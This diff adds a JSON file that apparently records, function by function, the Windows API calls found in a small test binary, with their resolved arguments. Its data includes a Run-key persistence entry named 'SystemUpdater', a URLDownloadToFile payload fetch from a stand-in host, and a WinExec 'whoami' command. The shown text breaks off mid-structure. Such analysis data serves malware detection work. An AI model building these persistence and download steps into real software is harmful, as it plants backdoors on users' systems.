@@ -1,0 +1,8265 @@
+{
+ "0x140001000": [],
+ "0x1400010f0": [
+  {
+   "call_addr": 5368713535,
+   "dll": "kernel32.dll",
+   "api_raw": "CreateFileA",
+   "api": "CreateFile",
+   "args": [
+    {
+     "name": "lpFileName",
+     "kind": "string",
+     "value": 5369192538,
+     "text": "C:\\Temp\\app.log"
+    },
+    {
+     "name": "dwDesiredAccess",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "dwShareMode",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "lpSecurityAttributes",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "dwCreationDisposition",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "dwFlagsAndAttributes",
+     "kind": "const",
+     "value": 128,
+     "text": "0x80"
+    },
+    {
+     "name": "hTemplateFile",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368713585,
+   "dll": "kernel32.dll",
+   "api_raw": "lstrlenA",
+   "api": "lstrlen",
+   "args": [
+    {
+     "name": "lpString",
+     "kind": "unknown",
+     "text": "<unknown>"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368713617,
+   "dll": "kernel32.dll",
+   "api_raw": "WriteFile",
+   "api": "WriteFile",
+   "args": [
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0xc)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368713627,
+   "dll": "kernel32.dll",
+   "api_raw": "CloseHandle",
+   "api": "CloseHandle",
+   "args": []
+  }
+ ],
+ "0x1400011d0": [
+  {
+   "call_addr": 5368713750,
+   "dll": "advapi32.dll",
+   "api_raw": "RegOpenKeyExA",
+   "api": "RegOpenKeyEx",
+   "args": [
+    {
+     "name": "hKey",
+     "kind": "const",
+     "value": 2147483649,
+     "text": "HKEY_CURRENT_USER"
+    },
+    {
+     "name": "lpSubKey",
+     "kind": "string",
+     "value": 5369192582,
+     "text": "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    },
+    {
+     "name": "ulOptions",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "samDesired",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    },
+    {
+     "name": "phkResult",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368713794,
+   "dll": "kernel32.dll",
+   "api_raw": "lstrlenA",
+   "api": "lstrlen",
+   "args": [
+    {
+     "name": "lpString",
+     "kind": "string",
+     "value": 5369192554,
+     "text": "C:\\Users\\Public\\updater.exe"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368713836,
+   "dll": "advapi32.dll",
+   "api_raw": "RegSetValueExA",
+   "api": "RegSetValueEx",
+   "args": [
+    {
+     "name": "hKey",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpValueName",
+     "kind": "string",
+     "value": 5369192628,
+     "text": "SystemUpdater"
+    },
+    {
+     "name": "Reserved",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "dwType",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "lpData",
+     "kind": "string",
+     "value": 5369192554,
+     "text": "C:\\Users\\Public\\updater.exe"
+    },
+    {
+     "name": "cbData",
+     "kind": "unknown",
+     "text": "<unknown>"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368713849,
+   "dll": "advapi32.dll",
+   "api_raw": "RegCloseKey",
+   "api": "RegCloseKey",
+   "args": []
+  }
+ ],
+ "0x1400012c0": [
+  {
+   "call_addr": 5368713960,
+   "dll": "urlmon.dll",
+   "api_raw": "URLDownloadToFileA",
+   "api": "URLDownloadToFile",
+   "args": [
+    {
+     "name": "pCaller",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "szURL",
+     "kind": "string",
+     "value": 5369192642,
+     "text": "http://example.com/payload.bin"
+    },
+    {
+     "name": "szFileName",
+     "kind": "string",
+     "value": 5369192673,
+     "text": "C:\\Users\\Public\\payload.bin"
+    },
+    {
+     "name": "dwReserved",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "lpfnCB",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140001300": [
+  {
+   "call_addr": 5368714003,
+   "dll": "kernel32.dll",
+   "api_raw": "WinExec",
+   "api": "WinExec",
+   "args": [
+    {
+     "name": "lpCmdLine",
+     "kind": "string",
+     "value": 5369192701,
+     "text": "cmd.exe /c whoami > C:\\Temp\\who.txt"
+    },
+    {
+     "name": "uCmdShow",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140001320": [],
+ "0x1400013e0": [
+  {
+   "call_addr": 5368714480,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_cexit",
+   "api": "_cexit",
+   "args": []
+  },
+  {
+   "call_addr": 5368714515,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__acrt_iob_func",
+   "api": "__acrt_iob_func",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368714536,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "setvbuf",
+   "api": "setvbuf",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368714548,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_crt_atexit",
+   "api": "_crt_atexit",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5368715232,
+     "text": "0x1400017e0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368714573,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_set_invalid_parameter_handler",
+   "api": "_set_invalid_parameter_handler",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5368715248,
+     "text": "0x1400017f0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368714721,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_set_app_type",
+   "api": "_set_app_type",
+   "args": []
+  },
+  {
+   "call_addr": 5368714735,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__p__fmode",
+   "api": "__p__fmode",
+   "args": []
+  },
+  {
+   "call_addr": 5368714751,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__p__commode",
+   "api": "__p__commode",
+   "args": []
+  },
+  {
+   "call_addr": 5368714812,
+   "dll": "api-ms-win-crt-locale-l1-1-0.dll",
+   "api_raw": "_configthreadlocale",
+   "api": "_configthreadlocale",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 4294967295,
+     "text": "0xffffffff"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368714831,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_initterm_e",
+   "api": "_initterm_e",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369458872,
+     "text": "0x1400b70b8"
+    },
+    {
+     "name": "arg1",
+     "kind": "pointer",
+     "value": 5369458880,
+     "text": "0x1400b70c0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368714924,
+   "dll": "api-ms-win-crt-heap-l1-1-0.dll",
+   "api_raw": "malloc",
+   "api": "malloc",
+   "args": []
+  },
+  {
+   "call_addr": 5368714982,
+   "dll": "api-ms-win-crt-heap-l1-1-0.dll",
+   "api_raw": "malloc",
+   "api": "malloc",
+   "args": []
+  },
+  {
+   "call_addr": 5368715050,
+   "dll": "kernel32.dll",
+   "api_raw": "SetUnhandledExceptionFilter",
+   "api": "SetUnhandledExceptionFilter",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5368715264,
+     "text": "0x140001800"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368715070,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_initterm",
+   "api": "_initterm",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "pointer",
+     "value": 5369458840,
+     "text": "0x1400b7098"
+    },
+    {
+     "name": "arg1",
+     "kind": "pointer",
+     "value": 5369458848,
+     "text": "0x1400b70a0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368715159,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "exit",
+   "api": "exit",
+   "args": []
+  },
+  {
+   "call_addr": 5368715164,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "abort",
+   "api": "abort",
+   "args": []
+  }
+ ],
+ "0x1400017b0": [],
+ "0x1400017c7": [],
+ "0x1400017e0": [],
+ "0x1400017f0": [],
+ "0x140001800": [],
+ "0x140001830": [],
+ "0x1400018b0": [],
+ "0x1400018c0": [],
+ "0x1400018e0": [
+  {
+   "call_addr": 5368715521,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_initialize_narrow_environment",
+   "api": "_initialize_narrow_environment",
+   "args": []
+  },
+  {
+   "call_addr": 5368715537,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_configure_narrow_argv",
+   "api": "_configure_narrow_argv",
+   "args": []
+  },
+  {
+   "call_addr": 5368715542,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "__p___argc",
+   "api": "__p___argc",
+   "args": []
+  },
+  {
+   "call_addr": 5368715552,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "__p___argv",
+   "api": "__p___argv",
+   "args": []
+  },
+  {
+   "call_addr": 5368715563,
+   "dll": "api-ms-win-crt-environment-l1-1-0.dll",
+   "api_raw": "__p__environ",
+   "api": "__p__environ",
+   "args": []
+  },
+  {
+   "call_addr": 5368715577,
+   "dll": "api-ms-win-crt-heap-l1-1-0.dll",
+   "api_raw": "_set_new_mode",
+   "api": "_set_new_mode",
+   "args": []
+  }
+ ],
+ "0x140001950": [],
+ "0x1400019a0": [],
+ "0x140001a10": [],
+ "0x140001aa0": [
+  {
+   "call_addr": 5368715978,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_seh_filter_exe",
+   "api": "_seh_filter_exe",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368716006,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_exit",
+   "api": "_exit",
+   "args": []
+  }
+ ],
+ "0x140001af0": [],
+ "0x140001b30": [],
+ "0x140001b50": [],
+ "0x140001b60": [
+  {
+   "call_addr": 5368716146,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__acrt_iob_func",
+   "api": "__acrt_iob_func",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368716174,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "_exit",
+   "api": "_exit",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 255,
+     "text": "0xff"
+    }
+   ]
+  }
+ ],
+ "0x140001ba0": [],
+ "0x140001bb0": [
+  {
+   "call_addr": 5368716263,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__acrt_iob_func",
+   "api": "__acrt_iob_func",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  }
+ ],
+ "0x140001c20": [],
+ "0x140001e03": [],
+ "0x140001e18": [],
+ "0x140001e6c": [],
+ "0x140001e7a": [],
+ "0x140001e84": [],
+ "0x140001e89": [],
+ "0x140001ee2": [],
+ "0x140001f20": [
+  {
+   "call_addr": 5368717282,
+   "dll": "kernel32.dll",
+   "api_raw": "VirtualQuery",
+   "api": "VirtualQuery",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x30)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 48,
+     "text": "0x30"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368717380,
+   "dll": "kernel32.dll",
+   "api_raw": "VirtualProtect",
+   "api": "VirtualProtect",
+   "args": [
+    {
+     "name": "lpAddress",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "dwSize",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "flNewProtect",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpflOldProtect",
+     "kind": "unknown",
+     "text": "<unknown>"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368717474,
+   "dll": "kernel32.dll",
+   "api_raw": "GetLastError",
+   "api": "GetLastError",
+   "args": []
+  }
+ ],
+ "0x1400020c0": [
+  {
+   "call_addr": 5368717543,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__acrt_iob_func",
+   "api": "__acrt_iob_func",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368717569,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "fwrite",
+   "api": "fwrite",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "string",
+     "value": 5369193619,
+     "text": "Mingw-w64 runtime failure:\n"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 27,
+     "text": "0x1b"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368717579,
+   "dll": "api-ms-win-crt-stdio-l1-1-0.dll",
+   "api_raw": "__acrt_iob_func",
+   "api": "__acrt_iob_func",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368717599,
+   "dll": "api-ms-win-crt-runtime-l1-1-0.dll",
+   "api_raw": "abort",
+   "api": "abort",
+   "args": []
+  }
+ ],
+ "0x140002130": [],
+ "0x140002140": [],
+ "0x1400021e0": [],
+ "0x140002200": [],
+ "0x140002740": [],
+ "0x1400028c0": [],
+ "0x140003040": [
+  {
+   "call_addr": 5368722930,
+   "dll": "kernel32.dll",
+   "api_raw": "RtlLookupFunctionEntry",
+   "api": "RtlLookupFunctionEntry",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x2568)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368723015,
+   "dll": "kernel32.dll",
+   "api_raw": "RtlVirtualUnwind",
+   "api": "RtlVirtualUnwind",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368723692,
+   "dll": "kernel32.dll",
+   "api_raw": "RtlLookupFunctionEntry",
+   "api": "RtlLookupFunctionEntry",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x2568)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368723777,
+   "dll": "kernel32.dll",
+   "api_raw": "RtlVirtualUnwind",
+   "api": "RtlVirtualUnwind",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368730880,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368732299,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140006640": [],
+ "0x1400066d0": [],
+ "0x140006c50": [],
+ "0x140006c90": [],
+ "0x140006d60": [],
+ "0x140006df0": [],
+ "0x140006ec0": [],
+ "0x140006f30": [],
+ "0x140007080": [],
+ "0x140007140": [],
+ "0x140007270": [],
+ "0x140007290": [],
+ "0x140007450": [],
+ "0x1400074b0": [],
+ "0x140007860": [],
+ "0x1400079e0": [],
+ "0x140007b90": [],
+ "0x140007d60": [],
+ "0x140007f90": [],
+ "0x14000beb0": [],
+ "0x14000bee0": [],
+ "0x14000c0f0": [],
+ "0x14000c1c3": [],
+ "0x14000c1e2": [],
+ "0x14000c204": [],
+ "0x14000c230": [],
+ "0x14000c3c0": [],
+ "0x14000c850": [],
+ "0x14000c8d0": [],
+ "0x14000c9a0": [],
+ "0x14000cc50": [],
+ "0x14000d0b0": [],
+ "0x14000e1f0": [],
+ "0x14000e280": [],
+ "0x14000ed80": [],
+ "0x14000f7c8": [],
+ "0x14000f85b": [],
+ "0x14000f8dc": [],
+ "0x14000f8fe": [],
+ "0x14000f92d": [],
+ "0x14000f95c": [],
+ "0x140010009": [],
+ "0x140010115": [],
+ "0x140010142": [],
+ "0x140010164": [],
+ "0x140010193": [],
+ "0x140012470": [],
+ "0x140012600": [],
+ "0x140013c20": [],
+ "0x140013f60": [],
+ "0x140013fc0": [],
+ "0x140014210": [],
+ "0x140014320": [],
+ "0x1400143c0": [],
+ "0x1400147b0": [],
+ "0x140014940": [],
+ "0x1400152c0": [],
+ "0x1400154a0": [],
+ "0x1400157f0": [],
+ "0x1400159b0": [],
+ "0x140015c00": [],
+ "0x140016260": [],
+ "0x140016270": [],
+ "0x140016290": [],
+ "0x1400162b0": [],
+ "0x1400167c0": [],
+ "0x140016820": [],
+ "0x140016890": [],
+ "0x140016930": [],
+ "0x140016b00": [],
+ "0x140016d30": [],
+ "0x140016d40": [],
+ "0x140016d60": [],
+ "0x140016d80": [],
+ "0x140016f30": [],
+ "0x1400171a0": [],
+ "0x1400172b0": [],
+ "0x140017450": [],
+ "0x1400187f0": [],
+ "0x140018b60": [],
+ "0x140018c40": [],
+ "0x140018d10": [],
+ "0x140018d80": [],
+ "0x140018de0": [],
+ "0x140018ee0": [],
+ "0x140018f60": [],
+ "0x140018fd0": [],
+ "0x140019470": [],
+ "0x1400195b0": [],
+ "0x140019a80": [
+  {
+   "call_addr": 5368816201,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateSection",
+   "api": "NtCreateSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x28698)"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 983045,
+     "text": "0xf0005"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368816217,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368816466,
+   "dll": "ntdll.dll",
+   "api_raw": "NtMapViewOfSection",
+   "api": "NtMapViewOfSection",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x28348)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368816486,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368816494,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368816772,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368817815,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnmapViewOfSection",
+   "api": "NtUnmapViewOfSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368817827,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368817835,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368829251,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368829395,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368836685,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368838010,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnmapViewOfSection",
+   "api": "NtUnmapViewOfSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368838022,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368838034,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368840095,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368840490,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368845182,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368846603,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368847103,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368847442,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368847933,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14001dc1c": [],
+ "0x14001f833": [],
+ "0x14001f84b": [],
+ "0x14001f857": [],
+ "0x14001f863": [],
+ "0x140022120": [],
+ "0x140022370": [],
+ "0x1400223f0": [],
+ "0x140022600": [],
+ "0x140022670": [],
+ "0x140022780": [],
+ "0x1400228b0": [],
+ "0x1400229b0": [],
+ "0x140022a90": [],
+ "0x1400231c0": [],
+ "0x140023950": [],
+ "0x140023b10": [
+  {
+   "call_addr": 5368855337,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnmapViewOfSection",
+   "api": "NtUnmapViewOfSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368855346,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140023b50": [
+  {
+   "call_addr": 5368855912,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateFile",
+   "api": "NtCreateFile",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x90)"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x70)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368856915,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368856997,
+   "dll": "ntdll.dll",
+   "api_raw": "NtLockFile",
+   "api": "NtLockFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368857037,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368857121,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368857145,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140024280": [
+  {
+   "call_addr": 5368857665,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetSystemTimePrecise",
+   "api": "RtlGetSystemTimePrecise",
+   "args": []
+  },
+  {
+   "call_addr": 5368857819,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForAlertByThreadId",
+   "api": "NtWaitForAlertByThreadId",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368857872,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetSystemTimePrecise",
+   "api": "RtlGetSystemTimePrecise",
+   "args": []
+  },
+  {
+   "call_addr": 5368858027,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForAlertByThreadId",
+   "api": "NtWaitForAlertByThreadId",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140024600": [
+  {
+   "call_addr": 5368858287,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetSystemTimePrecise",
+   "api": "RtlGetSystemTimePrecise",
+   "args": []
+  },
+  {
+   "call_addr": 5368858443,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForAlertByThreadId",
+   "api": "NtWaitForAlertByThreadId",
+   "args": []
+  }
+ ],
+ "0x140024770": [
+  {
+   "call_addr": 5368858527,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlQueryPerformanceFrequency",
+   "api": "RtlQueryPerformanceFrequency",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x8)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368858540,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlQueryPerformanceCounter",
+   "api": "RtlQueryPerformanceCounter",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368858605,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationThread",
+   "api": "NtQueryInformationThread",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551614,
+     "text": "-2"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x50)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32,
+     "text": "0x20"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368858627,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetSystemTimePrecise",
+   "api": "RtlGetSystemTimePrecise",
+   "args": []
+  },
+  {
+   "call_addr": 5368858703,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationProcess",
+   "api": "NtQueryInformationProcess",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x30)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 32,
+     "text": "0x20"
+    }
+   ]
+  }
+ ],
+ "0x1400248d0": [],
+ "0x140024950": [
+  {
+   "call_addr": 5368859436,
+   "dll": "ntdll.dll",
+   "api_raw": "LdrFindEntryForAddress",
+   "api": "LdrFindEntryForAddress",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368859581,
+   "dll": "ntdll.dll",
+   "api_raw": "LdrRegisterDllNotification",
+   "api": "LdrRegisterDllNotification",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg1",
+     "kind": "pointer",
+     "value": 5368859664,
+     "text": "0x140024c10"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5369535392,
+     "text": "0x1400c9ba0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x18)"
+    }
+   ]
+  }
+ ],
